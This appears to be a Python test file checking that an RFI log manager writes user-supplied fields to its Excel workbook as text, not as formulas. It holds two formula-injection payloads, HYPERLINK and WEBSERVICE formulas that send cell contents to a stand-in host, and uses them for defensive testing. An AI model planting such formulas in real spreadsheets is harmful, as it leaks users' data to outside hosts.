"""RFI log workbook must not store caller-supplied text as Excel formulas.

The RFI manager in ``1_DDC_Toolkit/Document-Control/rfi-management/SKILL.md``
writes every RFI through ``RFIManager._save_rfis`` (``DataFrame.to_excel``).
These tests load that implementation and call the methods that reach it.

A string that starts with ``=`` is attacker-controlled RFI text (subject,
question, and the other text fields the same save writes). The workbook is
safe only when that cell is stored as text. A leading apostrophe is accepted
because it keeps the cell as text. The payload must still be present.

These tests fail while ``_save_rfis`` writes a leading ``=`` as a formula.
They pass once those cells are written as text.

Not asserted here, because they are not stored as formulas by the writer this
skill uses (pandas with openpyxl, xlsxwriter not installed): values that start
with ``+``, ``-``, ``@``, a tab, or a carriage return. ``project_id`` is chosen
by whoever constructs ``RFIManager``. ``rfi_number``, status, and priority are
set by the class. ``cc_list`` and ``attachments`` are not columns in the log.
``generate_report`` writes a plain-text report, not a workbook.
"""

from __future__ import annotations

import sys
import tempfile
import types
import unittest
import zipfile
from pathlib import Path
from xml.etree import ElementTree as ET

REPO = Path(__file__).resolve().parents[1]
SKILL = REPO / "1_DDC_Toolkit" / "Document-Control" / "rfi-management" / "SKILL.md"
NS = "{http://schemas.openxmlformats.org/spreadsheetml/2006/main}"

HYPERLINK = '=HYPERLINK("http://example.invalid/?c="&B2,"open")'
WEBSERVICE = '=WEBSERVICE("http://example.invalid/"&A1)'

CREATE_FIELDS = (
    "subject",
    "question",
    "spec_section",
    "drawing_ref",
    "location",
    "submitted_by",
    "submitted_by_company",
    "assigned_to",
)


def load_rfi_module():
    """Execute the skill's Python implementation, not the usage example.

    The class is registered as a real module because ``@dataclass`` looks the
    class up in ``sys.modules`` while it reads annotations such as ``date``.
    ``__name__`` is not ``__main__``, so the skill's sample log is not written.
    """
    text = SKILL.read_text(encoding="utf-8")
    marker = "## Python Implementation"
    start = text.index(marker)
    fence = text.index("```python\n", start) + len("```python\n")
    end = text.index("\n```", fence)
    code = text[fence:end]
    name = "rfi_skill_under_test"
    module = types.ModuleType(name)
    module.__file__ = str(SKILL)
    sys.modules[name] = module
    exec(compile(code, str(SKILL), "exec"), module.__dict__)
    return module


def _shared_strings(archive: zipfile.ZipFile) -> list[str]:
    name = "xl/sharedStrings.xml"
    if name not in archive.namelist():
        return []
    root = ET.fromstring(archive.read(name))
    values = []
    for item in root.findall(f"{NS}si"):
        values.append("".join(node.text or "" for node in item.iter(f"{NS}t")))
    return values


def _cell_text(cell: ET.Element, shared: list[str]) -> str | None:
    kind = cell.get("t")
    if kind == "inlineStr":
        node = cell.find(f"{NS}is/{NS}t")
        return "" if node is None else (node.text or "")
    if kind == "s":
        node = cell.find(f"{NS}v")
        if node is None or node.text is None:
            return None
        return shared[int(node.text)]
    return None


def workbook_rows(path: Path) -> list[dict[str, dict]]:
    """Return each sheet row as column-letter -> {formula, text}."""
    with zipfile.ZipFile(path) as archive:
        shared = _shared_strings(archive)
        sheets = [
            name
            for name in archive.namelist()
            if name.startswith("xl/worksheets/sheet") and name.endswith(".xml")
        ]
        rows: list[dict[str, dict]] = []
        for name in sheets:
            root = ET.fromstring(archive.read(name))
            for row in root.iter(f"{NS}row"):
                cells: dict[str, dict] = {}
                for cell in row.findall(f"{NS}c"):
                    ref = cell.get("r") or ""
                    column = "".join(ch for ch in ref if ch.isalpha())
                    formula_node = cell.find(f"{NS}f")
                    cells[column] = {
                        "formula": None if formula_node is None else (formula_node.text or ""),
                        "text": _cell_text(cell, shared),
                    }
                rows.append(cells)
    return rows


def column_for(rows: list[dict[str, dict]], field: str) -> str:
    headers = rows[0]
    for column, cell in headers.items():
        if cell["text"] == field:
            return column
    raise AssertionError(f"column {field!r} is missing from the RFI log header")


def assert_field_is_text(rows: list[dict[str, dict]], field: str, payload: str) -> None:
    column = column_for(rows, field)
    seen = [row[column] for row in rows[1:] if column in row]
    if not seen:
        raise AssertionError(f"{field} has no data cell")
    accepted = {payload, "'" + payload}
    for cell in seen:
        formula = cell["formula"]
        if formula is not None:
            raise AssertionError(
                f"{field} was stored as an Excel formula {formula!r}, "
                f"not as text {payload!r}"
            )
        if cell["text"] not in accepted:
            raise AssertionError(
                f"{field} text {cell['text']!r} is not the supplied value {payload!r}"
            )


class RfiFormulaInjectionTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.module = load_rfi_module()
        cls.manager_cls = cls.module.RFIManager

    def _manager(self, directory: str):
        path = Path(directory) / "rfi_log_project.xlsx"
        return self.manager_cls("PROJECT-2026-001", str(path)), path

    def _create(self, manager, **overrides):
        values = {
            "subject": "Clarification on electrical panel location",
            "question": "Please confirm the panel location.",
            "submitted_by": "Ivan Petrov",
            "submitted_by_company": "ABC Electrical",
            "assigned_to": "Architect",
            "spec_section": "26 05 00",
            "drawing_ref": "E-101",
            "location": "Building A, Floor 1",
        }
        values.update(overrides)
        return manager.create_rfi(**values)

    def test_create_rfi_stores_leading_equals_fields_as_text(self):
        for payload in (HYPERLINK, WEBSERVICE):
            for field in CREATE_FIELDS:
                with self.subTest(field=field, payload=payload):
                    with tempfile.TemporaryDirectory() as directory:
                        manager, path = self._manager(directory)
                        self._create(manager, **{field: payload})
                        assert_field_is_text(workbook_rows(path), field, payload)

    def test_respond_to_rfi_stores_response_fields_as_text(self):
        for field in ("response", "response_by"):
            for payload in (HYPERLINK, WEBSERVICE):
                with self.subTest(field=field, payload=payload):
                    with tempfile.TemporaryDirectory() as directory:
                        manager, path = self._manager(directory)
                        rfi = self._create(manager)
                        kwargs = {
                            "rfi_number": rfi.rfi_number,
                            "response": "Room 105 is correct.",
                            "response_by": "John Architect",
                        }
                        kwargs[field] = payload
                        manager.respond_to_rfi(**kwargs)
                        assert_field_is_text(workbook_rows(path), field, payload)

    def test_close_rfi_stores_change_order_ref_as_text(self):
        for payload in (HYPERLINK, WEBSERVICE):
            with self.subTest(payload=payload):
                with tempfile.TemporaryDirectory() as directory:
                    manager, path = self._manager(directory)
                    rfi = self._create(manager)
                    manager.close_rfi(rfi.rfi_number, change_order_ref=payload)
                    assert_field_is_text(workbook_rows(path), "change_order_ref", payload)

    def test_formula_subject_stays_text_after_submit_respond_and_close(self):
        with tempfile.TemporaryDirectory() as directory:
            manager, path = self._manager(directory)
            rfi = self._create(manager, subject=HYPERLINK, question=WEBSERVICE)
            assert_field_is_text(workbook_rows(path), "subject", HYPERLINK)
            manager.submit_rfi(rfi.rfi_number)
            assert_field_is_text(workbook_rows(path), "subject", HYPERLINK)
            assert_field_is_text(workbook_rows(path), "question", WEBSERVICE)
            manager.respond_to_rfi(
                rfi.rfi_number,
                response="Room 105 is correct.",
                response_by="John Architect",
            )
            assert_field_is_text(workbook_rows(path), "subject", HYPERLINK)
            manager.close_rfi(rfi.rfi_number, change_order_ref="CO-14")
            rows = workbook_rows(path)
            assert_field_is_text(rows, "subject", HYPERLINK)
            assert_field_is_text(rows, "question", WEBSERVICE)

    def test_plain_and_embedded_equals_stay_text(self):
        plain = "Clarification on electrical panel location"
        embedded = "Panel location = Room 105, not the utility room"
        with tempfile.TemporaryDirectory() as directory:
            manager, path = self._manager(directory)
            self._create(manager, subject=plain, question=embedded)
            rows = workbook_rows(path)
            assert_field_is_text(rows, "subject", plain)
            assert_field_is_text(rows, "question", embedded)


if __name__ == "__main__":
    unittest.main()
